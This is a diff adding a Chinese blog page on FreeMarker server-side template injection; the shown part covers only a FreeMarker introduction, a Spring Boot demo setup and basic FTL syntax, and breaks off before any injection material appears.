@@ -1,0 +1,783 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSTI-Freemarker模板注入漏洞一、Freemarker 简介FreeMarker 是一款 模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个 Java类库，是一款程序员可以嵌入他们所开发产品的组件。模板编写为 FreeMarker Template Language (FTL)。它是简">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI-Freemarker模板注入漏洞">
+<meta property="og:url" content="http://example.com/2023/09/02/SSTI-Freemarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="白给&#39;s Blog">
+<meta property="og:description" content="SSTI-Freemarker模板注入漏洞一、Freemarker 简介FreeMarker 是一款 模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个 Java类库，是一款程序员可以嵌入他们所开发产品的组件。模板编写为 FreeMarker Template Language (FTL)。它是简">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/1692253648346-5980e250-383b-4d88-9738-2c1ee45a8d27.png">
+<meta property="og:image" content="http://example.com/image/1692255786949-7af6c0fe-7a87-48ab-8959-9c1b0e564adc.png">
+<meta property="og:image" content="http://example.com/image/1692256878378-75f36ccf-7214-42d2-980c-e573fc17bde2.png">
+<meta property="og:image" content="http://example.com/image/1692601460428-d9d31724-a209-438a-962d-e3433eefae48.png">
+<meta property="og:image" content="http://example.com/image/1692601561814-a1b02020-2ce9-448b-99f5-3a2780118cde.png">
+<meta property="og:image" content="http://example.com/image/1692601590997-6936a0a2-abb7-41fb-99ab-d8ad8257e147.png">
+<meta property="og:image" content="http://example.com/image/1692601622764-805dc5eb-68d7-4fe8-b188-80f063cf12a6.png">
+<meta property="og:image" content="http://example.com/image/image-20230831222714908.png">
+<meta property="og:image" content="http://example.com/image/1692602149932-c030eb2f-68b4-4e5b-a68e-aa9e057e1c89.png">
+<meta property="og:image" content="http://example.com/image/1692602913661-b9a4d5b3-416e-4448-8e6c-2b598232ac4c.png">
+<meta property="og:image" content="http://example.com/image/1692603044878-90df8b29-677d-46d8-916b-b7feee16cab6.png">
+<meta property="og:image" content="http://example.com/image/1692603062382-755bff01-0f67-4666-933c-e7fe33c28d6b.png">
+<meta property="og:image" content="http://example.com/image/1692603128711-c55b32e7-c58f-4993-b78f-c0bf705357ee.png">
+<meta property="og:image" content="http://example.com/image/1693463452916-d602cad0-ce1e-48f8-a288-d6352649eba2.png">
+<meta property="og:image" content="http://example.com/image/1692603220587-66f3a53f-d9d8-4b69-bda2-76e5712b7b98.png">
+<meta property="og:image" content="http://example.com/image/1692603062382-755bff01-0f67-4666-933c-e7fe33c28d6b.png">
+<meta property="og:image" content="http://example.com/image/image-20230831213348548.png">
+<meta property="og:image" content="http://example.com/image/image-20230831213451184.png">
+<meta property="og:image" content="http://example.com/image/image-20230831213617838.png">
+<meta property="og:image" content="http://example.com/image/image-20230831213702913.png">
+<meta property="og:image" content="http://example.com/image/image-20230831213852936.png">
+<meta property="og:image" content="http://example.com/image/image-20230831214145389.png">
+<meta property="og:image" content="http://example.com/image/image-20230831221401069.png">
+<meta property="og:image" content="http://example.com/image/image-20230831221447397.png">
+<meta property="og:image" content="http://example.com/image/image-20230831224541162.png">
+<meta property="og:image" content="http://example.com/image/image-20230901140401840.png">
+<meta property="og:image" content="http://example.com/image/image-20230901140448277.png">
+<meta property="og:image" content="http://example.com/image/image-20230901140537699.png">
+<meta property="og:image" content="http://example.com/image/image-20230901151520810.png">
+<meta property="og:image" content="http://example.com/image/image-20230901151620894.png">
+<meta property="og:image" content="http://example.com/image/image-20230902091715395.png">
+<meta property="og:image" content="http://example.com/image/image-20230902091752082.png">
+<meta property="og:image" content="http://example.com/image/image-20230902092640533.png">
+<meta property="og:image" content="http://example.com/image/image-20230902092809418.png">
+<meta property="og:image" content="http://example.com/image/image-20230902094928492.png">
+<meta property="og:image" content="http://example.com/image/image-20230902095100008.png">
+<meta property="article:published_time" content="2023-09-02T14:51:35.000Z">
+<meta property="article:modified_time" content="2023-09-02T03:39:21.123Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/image/1692253648346-5980e250-383b-4d88-9738-2c1ee45a8d27.png">
+  
+  
+  
+  <title>SSTI-Freemarker模板注入漏洞 - 白给&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白给&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SSTI-Freemarker模板注入漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-02 22:51" pubdate>
+          2023年9月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          31 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SSTI-Freemarker模板注入漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSTI-Freemarker模板注入漏洞"><a href="#SSTI-Freemarker模板注入漏洞" class="headerlink" title="SSTI-Freemarker模板注入漏洞"></a>SSTI-Freemarker模板注入漏洞</h1><h2 id="一、Freemarker-简介"><a href="#一、Freemarker-简介" class="headerlink" title="一、Freemarker 简介"></a>一、Freemarker 简介</h2><p>FreeMarker 是一款 模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个 Java类库，是一款程序员可以嵌入他们所开发产品的组件。<br>模板编写为 FreeMarker Template Language (FTL)。它是简单的，专用的语言， 不是像 PHP 那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。<br><img src="/image/1692253648346-5980e250-383b-4d88-9738-2c1ee45a8d27.png" srcset="/img/loading.gif" lazyload><br>这种方式通常被称为 MVC (模型 视图 控制器) 模式s，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。<br>而 FreeMarker 最初的设计，是被用来在 MVC 模式的 Web 开发框架中生成 HTML 页面的，它没有被绑定到 Servlet 或 HTML 或任意 Web 相关的东西上。它也可以用于非 Web 应用环境中。</p>
+<h2 id="二、Freemarker-使用"><a href="#二、Freemarker-使用" class="headerlink" title="二、Freemarker 使用"></a>二、Freemarker 使用</h2><h3 id="1、Spring-boot-Freemarker示例"><a href="#1、Spring-boot-Freemarker示例" class="headerlink" title="1、Spring boot + Freemarker示例"></a>1、Spring boot + Freemarker示例</h3><p>pom.xml 添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>spring-boot-starter-freemarker-2.7.13.pom</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.32<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context-support<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.28<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>application.yml 添加配置</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">freemarker:</span><br>    <span class="hljs-comment"># 模板后缀名</span><br>    <span class="hljs-attr">suffix:</span> <span class="hljs-string">.ftl</span><br>    <span class="hljs-comment"># 文档类型</span><br>    <span class="hljs-attr">content-type:</span> <span class="hljs-string">text/html</span><br>    <span class="hljs-comment"># 页面编码</span><br>    <span class="hljs-attr">charset:</span> <span class="hljs-string">UTF-8</span><br>    <span class="hljs-comment"># 页面缓存</span><br>    <span class="hljs-attr">cache:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-comment"># 模板路径</span><br>    <span class="hljs-attr">template-loader-path:</span> <span class="hljs-string">classpath:/templates/</span><br></code></pre></td></tr></table></figure>
+
+<p>新建 index.ftl</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>FreeMarker<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;user.age&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>新建 UserController </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.example.demo.bean.User;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/index&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(Model model)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setAge(<span class="hljs-number">5</span>);<br>        user.setName(<span class="hljs-string">&quot;li&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运行 Spring boot 项目，访问 index 成功显示<br><img src="/image/1692255786949-7af6c0fe-7a87-48ab-8959-9c1b0e564adc.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="2、Freemarker-模板"><a href="#2、Freemarker-模板" class="headerlink" title="2、Freemarker 模板"></a>2、Freemarker 模板</h3><p>见官方文档（<a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/dgui_template.html">http://freemarker.foofun.cn/dgui_template.html</a>）</p>
+<h4 id="1-、总体结构"><a href="#1-、总体结构" class="headerlink" title="(1)、总体结构"></a>(1)、总体结构</h4><p>实际上用程序语言编写的程序就是模板。 FTL (代表FreeMarker模板语言)。 这是为编写模板设计的非常简单的编程语言。<br>模板(FTL编程)是由如下部分混合而成的：</p>
+<ul>
+<li>文本：文本会照着原样来输出。</li>
+<li>插值：这部分的输出会被计算的值来替换。插值由 ${ and } 所分隔(或者 #{ and }，这种风格已经不建议再使用了；<a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/ref_depr_numerical_interpolation.html">点击查看更多</a>)。</li>
+<li>FTL 标签：FTL标签和HTML标签很相似，但是它们却是给FreeMarker的指示， 而且不会打印在输出内容中。</li>
+<li>注释：注释和HTML的注释也很相似，但它们是由 &lt;#– 和 –&gt;来分隔的。注释会被FreeMarker直接忽略， 更不会在输出内容中显示。</li>
+</ul>
+<p>我们来看一个具体的模板。其中的内容已经用颜色来标记了： 文本， 插值， FTL 标签， 注释。为了看到可见的 换行符， 这里使用了 [BR]。<br><img src="/image/1692256878378-75f36ccf-7214-42d2-980c-e573fc17bde2.png" srcset="/img/loading.gif" lazyload alt="image.png">s<br>注：</p>
+<ul>
+<li>FTL是区分大小写的。 list 是指令的名称而 List 就不是。类似地 ${name} 和 ${Name} 或 ${NAME} 也是不同的。</li>
+<li>插值 仅仅可以在 文本 中使用。 (也可以是字符串表达式；请参考 <a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/dgui_template_exp.html#dgui_template_exp_stringop_interpolation">后续内容</a>)</li>
+<li>FTL 标签 不可以在其他 FTL 标签 和 插值中使用。比如， 这样做是 <em>错误</em> 的： &lt;#if &lt;#include ‘foo’&gt;&#x3D;’bar’&gt;…&lt;&#x2F;#if&gt;</li>
+<li>注释 可以放在 FTL 标签 和 插值中</li>
+</ul>
+<h4 id="2-、指令"><a href="#2-、指令" class="headerlink" title="(2)、指令"></a>(2)、指令</h4><p>使用 FTL标签来调用 <strong>指令</strong>。 在示例中已经调用了 list 指令。在语法上我们使用了两个标签： &lt;#list animals as animal&gt; 和 &lt;&#x2F;#list&gt;。<br>FTL 标签分为两种：</p>
+<ul>
+<li>开始标签： &lt;#_directivename_ _parameters_&gt;</li>
+<li>结束标签： &lt;&#x2F;#_directivename_&gt;</li>
+</ul>
+<p>除了标签以 # 开头外，其他都和HTML，XML的语法很相似。 如果标签没有嵌套内容(在开始标签和结束标签之间的内容)，那么可以只使用开始标签。 例如 &lt;#if <em>something_&gt;</em>…<em>&lt;&#x2F;#if&gt;， 而FreeMarker知道 &lt;#include _something_&gt; 中的 include 指令没有可嵌套的内容。<br><em>parameters</em> 的格式由 <em>directivename_来决定。<br>事实上，指令有两种类型： <a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/gloss.html#gloss.predefinedDirective">预定义指令</a> 和 <a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/gloss.html#gloss.userDefinedDirective">用户自定义指令</a>。 对于用户自定义的指令使用 @ 来代替 #，比如，&lt;@mydirective _parameters_&gt;</em>…</em>&lt;&#x2F;@mydirective&gt;。 更深的区别在于如果指令没有嵌套内容，那么必须这么使用 &lt;@mydirective _parameters_ &#x2F;&gt;，这和XML语法很相似 (例如 <img _..._ />)。<br>assign 指令:主要是用于为该模板页面创建或替换一个顶层变量。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign name1=value1 name2=value2 ... nameN=valueN&gt;<br>or<br>&lt;#assign same as above... in namespacehash&gt;<br>or<br>&lt;#assign name&gt;<br>  capture <span class="hljs-built_in">this</span><br>&lt;/#assign&gt;<br>or<br>&lt;#assign name in namespacehash&gt;<br>  capture <span class="hljs-built_in">this</span><br>&lt;/#assign&gt;<br><br>Tips:name为变量名，value为表达式，namespacehash是命名空间创建的哈希表，是表达式。<br><br><span class="hljs-keyword">for</span> example:<br>&lt;#<span class="hljs-type">assign</span> <span class="hljs-variable">seq</span> <span class="hljs-operator">=</span> [<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;baz&quot;</span>]&gt;<span class="hljs-comment">//创建了一个变量名为seq的序列</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3-、表达式"><a href="#3-、表达式" class="headerlink" title="(3)、表达式"></a>(3)、表达式</h4><p>当需要给插值或者指令参数提供值时，可以使用变量或其他复杂的表达式。 例如，我们设x为8，y为5，那么 (x + y)&#x2F;2 的值就会被处理成数字类型的值6.5。<br>在我们展开细节之前，先来看一些具体的例子：</p>
+<ul>
+<li>当给插值提供值时：插值的使用方式为 ${<em>expression</em>}， 把它放到你想输出文本的位置上，然后给值就可以打印出来了。 即 ${(5 + 8)&#x2F;2} 会打印出 ‘’6.5’’ 来 (如果输出的语言不是美国英语，也可能打印出’’6,5’’来)。</li>
+<li>当给指令参数提供值时：在入门章节我们已经看到 if 指令的使用了。这个指令的语法是：&lt;#if <em>expression_&gt;</em>…_&lt;&#x2F;#if&gt;。 这里的表达式计算结果必须是布尔类型的。比如 &lt;#if 2 &lt; 3&gt; 中的 2 &lt;3 (2小于3)是结果为 true 的布尔表达式。</li>
+</ul>
+<h4 id="4-、插值"><a href="#4-、插值" class="headerlink" title="(4)、插值"></a>(4)、插值</h4><p>插值的使用格式是： ${<em>expression</em>}，这里的 <em>expression</em> 可以是所有种类的表达式(比如 ${100 + x})。<br>插值是用来给 <em>表达式</em> 插入具体值然后转换为文本(字符串)。插值仅仅可以在两种位置使用：在 <a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/dgui_template_overallstructure.html">文本区</a> (比如 Hello ${name}!) 和 <a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/dgui_template_exp.html#dgui_template_exp_stringop_interpolation">字符串表达式</a> (比如 &lt;#include “&#x2F;footer&#x2F;${company}.html”&gt;)中。<br>表达式的结果必须是字符串，数字或者日期&#x2F;时间&#x2F;日期-时间值， 因为(默认是这样)仅仅这些值可以被插值自动转换为字符串。其它类型的值 (比如布尔值，序列)必须 “手动地” 转换成字符串(后续会有一些建议)， 否则就会发生错误，中止模板执行。</p>
